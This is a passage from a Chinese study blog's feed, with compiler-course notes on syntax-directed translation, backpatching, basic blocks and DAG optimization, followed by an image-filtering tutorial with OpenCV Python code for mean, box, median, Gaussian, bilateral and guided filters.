那么它的SDT可以在LR语法分析过程中实现</li><li>当归约发生时执行相应的语义动作</li><li>LR语法分析栈扩展：使用一个附加的域来存放综合属性值</li></ul></li><li><strong>将L-SDD转换为SDT</strong><ul><li>将计算某个非终结符号A的继承属性的动作插入到产生式右部中紧靠在A的本次出现之前的位置上</li><li>将计算一个产生式左部符号的综合属性的动作放置在这个产生式右部的最右端</li></ul></li><li><strong>L-属性定义的SDT 实现</strong><ul><li>如果一个L-SDD的基本文法可以使用LL分析技术， 那么它的SDT可以在LL或LR语法分析过程中实现</li></ul></li></ul></li><li><strong>SDD与SDT</strong><ul><li>SDD<ul><li>是关于语言翻译的高层次规格说明</li><li>隐蔽了许多具体实现细节，使用户不必显式地说明翻译发生的顺序</li></ul></li><li>SDT<ul><li>可以看作是对SDD的一种补充，是SDD的具体实施方案</li><li>显式地指明了语义规则的计算顺序，以便说明某些实现细节</li></ul></li></ul></li></ul><h2 id="02-中间代码生成"><a href="#02-中间代码生成" class="headerlink" title="02 中间代码生成"></a>02 中间代码生成</h2><ul><li><strong>声明语句的翻译</strong><ul><li>基本类型表达式</li><li>数组类型表达式</li></ul></li><li><strong>简单赋值语句的翻译</strong><ul><li><strong>主要任务</strong>：生成对表达式求值的三地址码</li></ul></li><li><strong>数组引用的翻译</strong>：不考</li><li><strong>控制语句的翻译</strong><ul><li>if </li><li>if-else</li><li>while</li><li>for</li></ul></li></ul><h3 id="a-S-gt-if-E-then-S1-P195"><a href="#a-S-gt-if-E-then-S1-P195" class="headerlink" title="a. S -&gt; if E then S1 P195"></a>a. S -&gt; if E then S1 P195</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">S -&gt; if E then M S1</span><br><span class="line">&#123;</span><br><span class="line">backpatch(E.truelist, M.quad);</span><br><span class="line">S.nextlist=merge(E.falselist, S1.nextlist);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">M -&gt; ε</span><br><span class="line">&#123; </span><br><span class="line">M.quad = nextquad;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="b-S-gt-if-E-then-S1-else-S2"><a href="#b-S-gt-if-E-then-S1-else-S2" class="headerlink" title="b. S -&gt; if E then S1 else S2"></a>b. S -&gt; if E then S1 else S2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">S -&gt; if E then M1 S1 N else M2 S2</span><br><span class="line">&#123;</span><br><span class="line">backpatch(E.truelist, M1.quad);</span><br><span class="line">backpatch(E.falselist, M2.quad);</span><br><span class="line">S.nextlist = merge( S1.nextlist, N.nextlist, S2.nextlist );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">N -&gt; ε</span><br><span class="line">&#123; </span><br><span class="line">N.nextlist = makelist(nextquad);</span><br><span class="line">gen(‘goto _’);//emit(&apos;j,-,-,-&apos;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="c-S-gt-while-E-do-S1"><a href="#c-S-gt-while-E-do-S1" class="headerlink" title="c. S -&gt; while E do S1"></a>c. S -&gt; while E do S1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">S -&gt; while M1 E do M2 S1</span><br><span class="line">&#123;</span><br><span class="line">backpatch( S1.nextlist, M1.quad );</span><br><span class="line">backpatch( E.truelist, M2.quad );</span><br><span class="line">S.nextlist = E.falselist;</span><br><span class="line">gen(‘goto’ M1.quad);//emit(&apos;j,-,-,&apos;M1.quad)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="d-S-gt-for-E1-E2-E3-S1"><a href="#d-S-gt-for-E1-E2-E3-S1" class="headerlink" title="d. S -&gt; for(E1; E2; E3) S1"></a>d. S -&gt; for(E1; E2; E3) S1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="e-其他"><a href="#e-其他" class="headerlink" title="e. 其他"></a>e. 其他</h3><h1 id="Ch9-运行时存储空间组织"><a href="#Ch9-运行时存储空间组织" class="headerlink" title="Ch9 运行时存储空间组织"></a>Ch9 运行时存储空间组织</h1><ul><li><strong>运行存储分配策略</strong>：静态和动态分别对应 编译时刻和运行时刻<ul><li><strong>静态存储分配</strong>：对于那些在编译时刻就可以确定大小的数据对象，可以在编译时刻就为它们分配存储空间</li><li><strong>动态存储分配</strong>：反之，如果不能在编译时完全确定数据对象的大小，就要采用动态存储分配的策略。即在编译时仅产生各种必要的信息，而在运行时刻，再动态地分配数据对象的存储空间<ul><li>栈式存储分配</li><li>堆式存储分配</li></ul></li></ul></li></ul><h1 id="Ch10-优化"><a href="#Ch10-优化" class="headerlink" title="Ch10 优化"></a>Ch10 优化</h1><h2 id="01-划分基本块"><a href="#01-划分基本块" class="headerlink" title="01 划分基本块"></a>01 划分基本块</h2><p>基本块是满足下列条件的最大的连续三地址指令序列：</p><ul><li>控制流只能从基本块的第一个指令进入该块。也就是说，没有跳转到基本块中间或末尾指令的转移指令</li><li>除了基本块的最后一个指令，控制流在离开基本块之前不会跳转或者停机</li><li>Halt？？</li></ul><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-16_21-00-07.jpg" class="lozad"></p><h2 id="02-作出程序控制流图"><a href="#02-作出程序控制流图" class="headerlink" title="02 作出程序控制流图"></a>02 作出程序控制流图</h2><ul><li>流图的结点是一些基本块</li><li>从基本块B到基本块C之间有一条边当且仅当基本块C 的第一个指令可能紧跟在B的最后一条指令之后执行；此时称B是C的前驱， C是B的后继</li><li><strong>边的确定</strong><ul><li>有一个从B的结尾跳转到C的开头的条件或无条件跳转语句</li><li>按照原来的三地址语句序列中的顺序，C紧跟在之B 后，                                   </li></ul></li></ul><h2 id="03-基本块优化"><a href="#03-基本块优化" class="headerlink" title="03 基本块优化"></a>03 基本块优化</h2><ul><li><strong>DAG</strong>：很多重要的局部优化技术首先把一个基本块转换成为 一个无环有向图</li><li><strong>表示</strong>：基本块中的每个语句s都对应一个内部结点N<ul><li>结点N的标号是s中的运算符；同时还有一个定值变量表被关联到N ，表示s是 在此基本块内最晚对表中变量进行定值的语句</li><li>N的子结点是基本块中在s之前、最后一个对s所使用的运算分量进行定值的语 句对应的结点。如果s的某个运算分量在基本块内没有在s之前被定值，则这 个运算分量对应的子结点就是代表该运算分量初始值的叶结点(为区别起见， 叶节点的定值变量表中的变量加上下脚标0)</li><li>在为语句x=y+z构造结点N的时候，如果x已经在某结点M的定值变量表中，则 从M的定值变量表中删除变量x</li><li>对于形如x=y+z的三地址指令， 如果已经有一个结点表示y+z， 就不往DAG中增加新的结点， 而是给已经存在的结点附加 定值变量x</li></ul></li><li><strong>删除无用代码</strong><ul><li>从一个DAG上删除所有没有附加活跃变量（活跃变量是指其值可能会在以后被使用的变量）的根结点(即没有父结点的结点) 。重复应用这样的处理过程就可以从DAG 中消除所有对应于无用代码的结点</li></ul></li></ul><h2 id="04-循环优化"><a href="#04-循环优化" class="headerlink" title="04 循环优化"></a>04 循环优化</h2><ul><li><strong>代码外提</strong></li><li><strong>删除归纳变量</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图像滤波整理</title>
      <link href="/2020/11/08/%E5%9B%BE%E5%83%8F%E6%BB%A4%E6%B3%A2%E6%95%B4%E7%90%86/"/>
      <url>/2020/11/08/%E5%9B%BE%E5%83%8F%E6%BB%A4%E6%B3%A2%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="图像滤波"><a href="#图像滤波" class="headerlink" title="图像滤波"></a>图像滤波</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ol><li><strong>定义</strong>：图像滤波，即在尽量保留图像细节特征的条件下对目标图像的噪声进行抑制，是图像预处理中不可缺少的操作，其处理效果的好坏将直接影响到后续图像处理和分析的有效性和可靠性。</li><li><strong>比喻：</strong>我们可以把滤波器想象成一个包含加权系数的窗口，当使用这个滤波器平滑处理图像时，就把这个窗口放到图像之上，透过这个窗口来看我们得到的图像。</li><li><strong>公式：</strong> <script type="math/tex">O(i, j) = \sum_{m,n}I(i+m,j+n)K(m,n)</script> 其中O(i, j)是像素输出值，I(i+m, j+n)是像素输入值，K为滤波器（核：二维矩阵，核的不同值表示不同的算法。）</li><li><strong>种类</strong>：低通滤波器可以消除噪声、模糊化，高通滤波器可以提取边缘。<a href="https://blog.csdn.net/u013631121/article/details/80444602?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">白话文讲计算机视觉-第三讲-滤波器</a></li><li><strong>作用</strong>：图像滤波可以更改或者增强图像。通过滤波，可以强调一些特征或者去除图像中一些不需要的部分。滤波是一个邻域操作算子，利用给定像素周围的像素的值决定此像素的最终的输出值。常见的应用包括去噪、图像增强、检测边缘、检测角点、模板匹配等。</li></ol><h2 id="非学习类型算法"><a href="#非学习类型算法" class="headerlink" title="非学习类型算法"></a>非学习类型算法</h2><h3 id="0x01-均值滤波"><a href="#0x01-均值滤波" class="headerlink" title="0x01 均值滤波"></a>0x01 均值滤波</h3><ol><li><strong>定义</strong>：用其像素点周围像素的平均值代替元像素值，在滤除噪声的同时也会滤掉图像的边缘信息。</li><li><strong>代码：</strong>Python调用OpenCV实现均值滤波的核心函数：<strong>result = cv2.blur(原始图像,  核大小)</strong>   其中，核大小是以（宽度，高度）表示的元组形式，常见的形式包括：核大小（3，3）和（5，5）。<strong>boxFilter</strong>也可实现。</li></ol><h3 id="0x02-方框滤波"><a href="#0x02-方框滤波" class="headerlink" title="0x02 方框滤波"></a>0x02 方框滤波</h3><ol><li><strong>定义</strong>：方框滤波和均值滤波核基本一致，区别是需不需要均一化处理。</li><li><strong>代码</strong>： OpenCV调用boxFilter()函数实现方框滤波。函数：<strong>result = cv2.boxFilter(原始图像, 目标图像深度, 核大小, normalize属性)</strong>  其中，目标图像深度是int类型，通常用“-1”表示与原始图像一致；核大小主要包括（3，3）和（5，5）；normalize属性表示是否对目标图像进行归一化处理，当normalize为true时需要执行均值化处理，当normalize为false时，不进行均值化处理，实际上为求周围各像素的和，很容易发生溢出，溢出时均为白色，对应像素值为255。</li></ol><h3 id="0x03-中值滤波"><a href="#0x03-中值滤波" class="headerlink" title="0x03 中值滤波"></a><strong>0x03 中值滤波</strong></h3><ol><li><strong>定义：</strong>中值滤波用测试像素周围邻域像素集中的中值代替原像素。中值滤波去除椒盐噪声和斑块噪声时，效果非常明显。在OpenCV中，可以使用函数medianBlur进行操作。</li><li><strong>代码</strong>： OpenCV主要调用medianBlur()函数实现中值滤波。图像平滑里中值滤波的效果最好。<strong>dst = cv2.medianBlur(src, ksize)</strong>   其中，src表示源文件，ksize表示核大小。核必须是大于1的奇数，如3、5、7等。</li></ol><h3 id="0x04-高斯滤波"><a href="#0x04-高斯滤波" class="headerlink" title="0x04 高斯滤波"></a>0x04 高斯滤波</h3><ol><li><strong>定义</strong>：加权平均，距离越近的点权重越大，距离越远的点权重越小。由于图像是二维矩阵，则采用二维高斯函数(正态分布)<script type="math/tex">f(x,y)= \frac{1}{2πσ^2} e^{\frac{-(x^2+y^2)}{2σ^2}}</script> 。如果原图是彩色图片，可以对RGB三个通道分别做高斯模糊。参考：<a href="https://blog.csdn.net/nima1994/article/details/79776802" target="_blank" rel="noopener">高斯模糊（高斯滤波）的原理与算法</a></li><li><strong>边界处理</strong>：把已有的点拷贝到另一面的对应位置，模拟出完整的矩阵。</li><li><strong>公式</strong>：以 q为中心的窗口中，某一点 p在高斯滤波过程中。 权重(空间)： <script type="math/tex">G(p) = \frac{1}{2πσ^2} e^{\frac{-||p-q||^2}{2σ^2}}</script> </li><li><strong>代码</strong>：Python中OpenCV主要调用GaussianBlur函数：<strong>dst = cv2.GaussianBlur(src, ksize, sigmaX)</strong>   其中，src表示原始图像；ksize表示核大小，核大小（N, N）必须是奇数；sigmaX表示X方向方差，主要控制权重，sigmaX小，表现在高斯曲线上就是曲线越高越尖，表现在滤波效果上就是模糊程度小（sigmaX大，表现在高斯曲线上就是曲线越矮越平缓，表现在滤波效果上就是模糊程度大）。 </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入库</span></span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取图片</span></span><br><span class="line">img = cv2.imread(<span class="string">'02.png'</span>)</span><br><span class="line">source = cv2.cvtColor(img,cv2.COLOR_BGR2RGB)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#方框滤波</span></span><br><span class="line">img_box = cv2.boxFilter(source, <span class="number">-1</span>, (<span class="number">5</span>,<span class="number">5</span>), normalize=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 均值滤波</span></span><br><span class="line">img_blur = cv2.blur(source, (<span class="number">5</span>,<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#中值滤波</span></span><br><span class="line">img_median = cv2.medianBlur(source, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯滤波</span></span><br><span class="line">img_Guassian = cv2.GaussianBlur(source, (<span class="number">5</span>,<span class="number">5</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图形</span></span><br><span class="line">titles = [<span class="string">'Source Image'</span>, <span class="string">'BoxFilter Image'</span>, <span class="string">'Blur Image'</span>, </span><br><span class="line">         <span class="string">'Median Image'</span>, <span class="string">'Guassian Image'</span>]  </span><br><span class="line">images = [source, img_box, img_blur, img_Guassian, img_median]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):  </span><br><span class="line">   plt.subplot(<span class="number">2</span>, <span class="number">3</span>, i+<span class="number">1</span>), plt.imshow(images[i], <span class="string">'gray'</span>)  </span><br><span class="line">   plt.title(titles[i])  </span><br><span class="line">   plt.xticks([]),plt.yticks([])  </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/Eastmount/article/details/82216380?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">我跳</a></p><h3 id="0x05-双边滤波-—-边缘保护滤波"><a href="#0x05-双边滤波-—-边缘保护滤波" class="headerlink" title="0x05 双边滤波 —  边缘保护滤波"></a>0x05 双边滤波 —  <strong>边缘保护滤波</strong></h3><ol><li><strong>定义</strong>：高斯滤波只考虑了周边点与中心点的空间距离来计算得到权重，会模糊掉边缘。在高斯滤波的基础上加入了像素值(灰度)权重项，也就是说既要考虑距离因素，也要考虑像素值差异的影响，像素值越相近，权重越大。参考：<a href="http://www.360doc.com/content/17/0306/14/28838452_634420847.shtml" target="_blank" rel="noopener">双边滤波详解</a>、<a href="https://blog.csdn.net/u013921430/article/details/84532068" target="_blank" rel="noopener">【图像处理】——双边滤波</a></li><li><strong>公式：</strong> 像素值权重     <script type="math/tex">G_r= exp(-{\frac{||I_p-I_q||^2}{2σ^2_r}})</script>  空间距离权重  <script type="math/tex">G_s= exp(-{\frac{||p-q||^2}{2σ^2_s}})</script>  滤波窗口内每个像素值的权重和 <script type="math/tex">W(q) = \sum_{p\in S} G_s(p)G_r(p)</script> —-用于权重的归一化 滤波结果： <script type="math/tex">BF = \frac {1}{W_q}\sum_{p\in S} G_s(p)G_r(p)*I_p</script> </li><li><strong>代码</strong>：OpenCV在Python中双边滤波函数是<strong>cv2.bilateralFilter(src, d, sigmaColor, sigmaSpace）</strong>时间复杂度 <script type="math/tex">O(Nr^2)</script>  <strong>① s</strong>rc是输入图像； ② d是在过滤期间使用的每个像素邻域的直径，如果输入d非0，则sigmaSpace由d计算得出，如果sigmaColor没输入，则sigmaColor由sigmaSpace计算得出； ③ sigmaColor是灰度值相似性高斯函数标准差，色彩空间的标准方差，一般尽可能大， 较大的参数值意味着像素邻域内较远的颜色会混合在一起， 从而产生更大面积的半相等颜色； ④ sigmaSpace是空间高斯函数标准差，坐标空间的标准方差(像素单位)，一般尽可能小。 参数值越大意味着只要它们的颜色足够接近，越远的像素都会相互影响。 当d &gt; 0时，它指定邻域大小而不考虑sigmaSpace。 否则，d与sigmaSpace成正比。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#导入库</span></span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取图片</span></span><br><span class="line">img = cv2.imread(<span class="string">'02.png'</span>)</span><br><span class="line">source = cv2.cvtColor(img,cv2.COLOR_BGR2RGB)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#双边滤波</span></span><br><span class="line">img_bilateral = cv2.bilateralFilter(source, <span class="number">7</span>, <span class="number">50</span>, <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#显示图形</span></span><br><span class="line">titles = [<span class="string">'Source Image'</span>, <span class="string">'bilateralFilter Image'</span>]  </span><br><span class="line">images = [source, img_bilateral]  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):  </span><br><span class="line">   plt.subplot(<span class="number">1</span>, <span class="number">2</span>, i+<span class="number">1</span>), plt.imshow(images[i], <span class="string">'gray'</span>)  </span><br><span class="line">   plt.title(titles[i])  </span><br><span class="line">   plt.xticks([]),plt.yticks([]) <span class="comment">#禁止输出坐标轴 </span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="0x06-引导滤波-—-边缘保护滤波"><a href="#0x06-引导滤波-—-边缘保护滤波" class="headerlink" title="0x06  引导滤波 — 边缘保护滤波"></a>0x06  引导滤波 — <strong>边缘保护滤波</strong></h3><h4 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a><strong>1. 定义</strong></h4><p>　　引导滤波的思想用一张引导图像产生权重，从而对输入图像进行处理。引导滤波除了可以用于图像平滑，还可以用于HDR压缩、细节增强、图像去雾、联合上采样等图像处理任务。引导滤波中空间域的贡献自然取决于窗口的大小，即由参数 r 决定。而标准差则是评判颜色差异性的参数，窗口中标准差越大，说明局部的像素相似性越差。</p><h4 id="2-公式：【图像处理】引导滤波"><a href="#2-公式：【图像处理】引导滤波" class="headerlink" title="2. 公式：【图像处理】引导滤波"></a><strong>2. 公式：</strong><a href="https://blog.csdn.net/u013921430/article/details/99695647" target="_blank" rel="noopener">【图像处理】引导滤波</a></h4><ol><li><strong>权重</strong> <script type="math/tex">W_{ij}(i,j) = \frac{1}{|ω|^2} \sum_{k:(i,j)\in ω_k} (1+ \frac{(I_i-μ_k)(I_j-μ_k)}{σ_k^2+ϵ})</script>   (局部窗口 <script type="math/tex">ω_k</script> ；ϵ是 <script type="math/tex">L_2</script> 范数正则化系数，防止<script type="math/tex">a_k</script> 过大； <script type="math/tex">μ_k</script>与 <script type="math/tex">σ_k</script> 表示 <script type="math/tex">I_i</script> 在窗口内的均值、标准差； <script type="math/tex">∣w∣</script> 表示窗口内像素块的总数 )</li><li><strong>结果</strong> <script type="math/tex">q_i = \sum_{j}{W_{ij}(I)*p_j}</script>   (q、I、p分表表示输出图像、引导图像和输入图像 ，i、j 分别表示图像中像素点的索引。权重 W 仅与引导图像 I 有关，而在双边滤波中权重 W 由输入图像自身决定。)</li></ol><h4 id="3-代码1-引导滤波-："><a href="#3-代码1-引导滤波-：" class="headerlink" title="3. 代码1(引导滤波)："></a><strong>3. 代码1(引导滤波)</strong>：</h4><p>　　第一个代码块是手写实现引导滤波。时间复杂度O(N)，当 r 与 ϵ 越大，图像被平滑的程度越大。伪代码中：r是窗口半径， <script type="math/tex">f_{mean}(I,r)</script> 表示在(r, r)窗口对图像做均值滤波。大佬博客：<a href="https://blog.csdn.net/u013921430/article/details/99695647" target="_blank" rel="noopener">我跳</a><br>　　第二个代码块是使用的现有库。参考：<a href="https://jinzhangyu.github.io/2018/09/06/2018-09-06-OpenCV-Python%E6%95%99%E7%A8%8B-16-%E5%B9%B3%E6%BB%91%E5%9B%BE%E5%83%8F-3/" target="_blank" rel="noopener">我跳</a></p><p><img alt="&#x56FE;1 GF&#x7B97;&#x6CD5;&#x6846;&#x67B6;" data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/GF.png" class="lozad"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@First_author: 不用先生</span></span><br><span class="line"><span class="string">@Second_author: Dragon Liu</span></span><br><span class="line"><span class="string">Operating environment: Python 3.7.1</span></span><br><span class="line"><span class="string">lib:  opencv-python</span></span><br><span class="line"><span class="string">Date: 2020/3/16</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">input_fn = <span class="string">'03.png'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数名：my_guidedFilter_oneChannel</span></span><br><span class="line"><span class="comment"># 函数功能：用于单通道图像（灰度图）的引导滤波函数；</span></span><br><span class="line"><span class="comment"># 参数：srcImg：输入图像，为单通道图像；</span></span><br><span class="line"><span class="comment"># 参数：guideImg：引导图像，为单通道图像，尺寸与输入图像一致；</span></span><br><span class="line"><span class="comment"># 参数：rad：滤波器大小r，应该保证为奇数，默认值为9；</span></span><br><span class="line"><span class="comment"># 参数：eps：防止a过大的正则化参数ϵ，</span></span><br><span class="line"><span class="comment"># 返回：dstImg：输出图像，尺寸、通道数与输入图像吻合；</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_guidedFilter_oneChannel</span><span class="params">(srcImg, guidedImg, rad=<span class="number">13</span>, eps=<span class="number">0.1</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换数值类型，并归一化</span></span><br><span class="line">    srcImg = srcImg/<span class="number">255.0</span></span><br><span class="line">    guidedImg = guidedImg/<span class="number">255.0</span></span><br><span class="line">    img_shape = np.shape(srcImg)<span class="comment">#查看矩阵或者数组的维数。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在(rad, rad)窗口的内对图像做均值滤波。</span></span><br><span class="line">    P_mean = cv2.boxFilter(srcImg, <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment"># p的均值平滑</span></span><br><span class="line">    I_mean = cv2.boxFilter(guidedImg,<span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment"># I的均值平滑</span></span><br><span class="line"></span><br><span class="line">    I_square_mean = cv2.boxFilter(np.multiply(guidedImg, guidedImg), <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment">#I*I的均值平滑</span></span><br><span class="line">    I_mul_P_mean = cv2.boxFilter(np.multiply(srcImg, guidedImg), <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>)<span class="comment"># I*p的均值平滑</span></span><br><span class="line">    </span><br><span class="line">    var_I = I_square_mean-np.multiply(I_mean,I_mean)<span class="comment"># 方差</span></span><br><span class="line">    cov_I_P = I_mul_P_mean-np.multiply(I_mean,P_mean)<span class="comment"># 协方差</span></span><br><span class="line">    </span><br><span class="line">    a = cov_I_P/(var_I+eps)<span class="comment"># 相关因子a</span></span><br><span class="line">    b = P_mean-np.multiply(a,I_mean)<span class="comment"># 相关因子b</span></span><br><span class="line">    </span><br><span class="line">    a_mean = cv2.boxFilter(a, <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>) <span class="comment"># 对a进行均值平滑</span></span><br><span class="line">    b_mean = cv2.boxFilter(b, <span class="number">-1</span>, (rad, rad), normalize=<span class="literal">True</span>)  <span class="comment"># 对b进行均值平滑</span></span><br><span class="line">    </span><br><span class="line">    dstImg = np.multiply(a_mean,guidedImg)+b_mean</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> dstImg*<span class="number">255.0</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 函数名：my_guidedFilter_threeChannel</span></span><br><span class="line"><span class="comment"># 